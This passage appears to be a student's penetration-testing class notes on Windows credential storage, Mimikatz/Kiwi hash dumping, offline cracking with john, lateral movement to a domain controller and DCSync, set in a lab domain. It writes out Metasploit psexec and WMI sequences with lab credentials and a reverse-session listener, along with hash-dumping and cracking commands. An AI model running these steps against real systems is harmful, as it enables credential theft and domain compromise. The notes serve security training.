**Windows Credentials Refresher**
![[17.2.14.jpg]]
**Security Accounts Manager**: Windows store credentials In **SAM** database
- It is similar to etc/shadow/ in linux 
- This is for Windows
**Local Security Authority Subsystem Service (LSASS)**: Window's stored database

**Local Account**: Passwords are continuously stored in SAM and are always available offline 
**Domain Account**: Primarily use Kerberos for authentication, do not have their credentials stored in SAM
- Domain user logs in to windows, their credentials are cached in the registry 
	- **Registry**: Database in Windows that stores setting for Windows and application 
		- REGISTRY SETTING: 
			- ![[17.3.0.jpg]]
		- LOCATION OF REGISTRY SETTINGS:
			- ![[17.3.1.jpg]]
				- Specific Registry key appear blank, as it is accessible by SYSTEM
				- However, this file shows that it contains data 
					- NOTE: Not viewable as a standard user
					- Must be SYSTEM to access file 
Note: By default in Windows 10, up to 10 network/domain credential are cached at a time 
- View this default value in the local security policy 
- You can change the policy 

**Mimikatz**: Windows-purposed credential dumping tool that is able to decrypt almost all stored credential in Windows
- It is a complex tool
- We will use Metasploit version of Mimikatz called Kiwi
Note: Mimikatz is used all the time, used to decrypt credentials 

____
Instructor Demo: Minikatz 

signing into Tstark by using his credentials and running minikatz on their account 
![[17.3.0.1 1.jpg]]
msfconsole (running metasploit)
use exploit/windows/smb/psexec
set RHOSTS 172.22.117.20`
set SMBUSER tstark`
set SMBPass Password!`
set SMBDomain megacorpone`
set LHOST 172.22.117.100
run

getuid
- Nt Authority\system
	- Meaning we have admin

NOTE: We want to use Minikatz's kiwi to steal credentials that are encrypted (We need admin prvileges to steal credentials and tstark is admin)
- we want more credentials that are admin just in case our user does not have enough data 
	- we want another back door 
	- we can hide from monitoring by mitgraiting to HR or IT users 

![[17.3.0.2.jpg]]
load kiwi (Minikatz)

NOTES: kiwi is for extract credential hashes 

![[17.3.0.3.jpg]]
running the kiwi_cmd lsadump::cahce
- We want to look for mscacheV2 from bbanner and pparker 

![[17.3.0.4.jpg]]
Create a new tab in the terminal and create a file with the hash
nano lsa_hash.txt

Banner:Hash
- username:hash number

john --format=mscache2 lsa_hash.txt

NOTE: We were able to crack bbanner hash 
Mitigation:
- More complex password
- Password rotation 
- More Complex hashing programs

___
**Lateral Movement** (Learn how to expand our access on the network)
NOTE: Rare for pen tester to complete their goal by accessing a single machine 
- Often, they need to move throughout the network, compromising other machines to either obtain the goal or access to achieve the goal 

![[17.3.2.jpg]]- Example; Objective in this penetration test is to gain access to MegaCorpOne's domain controller and steal its top secret file 
___
**Lateral Movement**: Mean moving through the network from one machine to another 
- IE: **PsExec**: Tool that manages Windows machines remotely using powershell
	- For MegaCorpOne, leverage the credentials that we gathered and cracked from the windows 10 machines to move to the domain controller 
- NOTE: Lateral Movement techniques often overlap with initial access techniques, as both tactics typically leverage the execution of code 

Two key difference between lateral movement and initial access exist; 
1. Lateral movement requires already have internal network access, as lateral movement means moving inside the network 
	- Initial access refers only to the initial way that we get access to a machine on the internal network 
2. There's often a greater number of possibilities for code execution when performing lateral movement 
	- Within an internal network, network firewall rules seldom apply and internally networked machine often have greater access to ports to other machines on the network 

![[17.3.3.jpg]]

___
Activity: Lateral Movement
Go back to the first cmd 
back ground 
use exploit/windows/local/wmi
options

![[17.3.0.6.jpg]]
set RHOSTS 172.22.117.10`
set SESSION [ID of the active Meterpreter session running as SYSTEM]
- The SYSTEM was admin which was Tstark (Windows 10 - Tstark)
	- We will use the session 172.22.117.10
	- The session would be 1 
		- The reason why we set the session to 1 is because that is the machine we have access too
set SMBDomain megacorpone`
set SMBUser bbanner`
set SMBPass Winter2021`
set LHOST 172.22.117.100

![[17.3.0.7.jpg]]
Note This will create a new session (2)
- Sysinfo
	- We are login WINDC01
- getuid
	- We are sign into bbanner 
![[17.3.0.8.jpg]]
We are able to privesca by using lateral movement 

Mitigation:
Add ACL to important system
- ACL are Access control list 
	- This will on only allow certain people to sign in 
___
**Credential Access**
Note: Since we now have access to WINDC01 from a SYSTEM Meterpreter shell, we have unfettered access to the *entire domain*
- Two key piece of Active Directory Domain;
	1. ***bbanner account***
		- **Part of the Domain Administrator group in AD**
			- This means that we have the ability to log in to any machine by default, to create and delete accounts, reset passwords, etc 
	2. ***WINDC01***
		- **The Primary domain controller from the domain** 
			- This is the machine that handles network login, access control for network assets, etc. 

![[17.3.4.jpg]]
- Having SYSTEM or Administrator access to a domain controller means that, directly or indirectly, you have access to every single domain user's password hash, which can be exfiltrated and then cracked offline 

![[17.3.5.jpg]]
One network can contain multiple domain controllers 
- Often, there's a *primary* which handles the Kerberos authentication and other services, such as DNS 
- *Secondary Domain* controller often have other services running, such as file shares and VoIP services 
	- However, if secondary DCs are configured with domain services, they can act as backups to the primary DC 

![[17.3.6.jpg]]

![[17.3.7.jpg]]
Ability to replicate data from a domain controller is a reserviced privilege for domain controller computer accounts or domain administrator 
- However, due to changes in how the hashes are actually stored and how the *NTDS.dit* file is read, technique is not applicable to Windows 10+ and Server 2016+ 


**DCSync**
![[17.3.8.jpg]]
**DCSync:** Newer, preferred technique for accessing password hashes on domain controller 
- Involves replicating the data from a domain controller and parsing through it to extract the password hashes for user 

- DCSync requires replication rights, so you must have a domain administrator account or be SYSTEM on a domain controller itself
- DCSync does not have a standalone Metasploit module 
	- We can use Kiwi to perform DCSync 
- Difference between Kiwi and .exe version of Minikatz
	- Kiwi: Must specify a usernname with password hash you want
	- .exe: Mimikatz will return all users' password hashes when performing DCSync 


note: DCSYNC sync with each other which means that users are able to sync with anything that is connect with DYNCsync 

____
Instructor Demo: Credential Access
$ Session 
- We want to go to session 2 (back to metapreter)
	- we know that Bbanner is in metapreter
$ Session -i 2 
- -i: Interact 
	- We should have this because we want to enter -i2
$ shell
- WE want to run as SYSTEM

$ net user 
- We want to see a list of users 

$ exit 
- We want to go back to meterpreter 

$ load kiwi
- Using program to do an credential attack
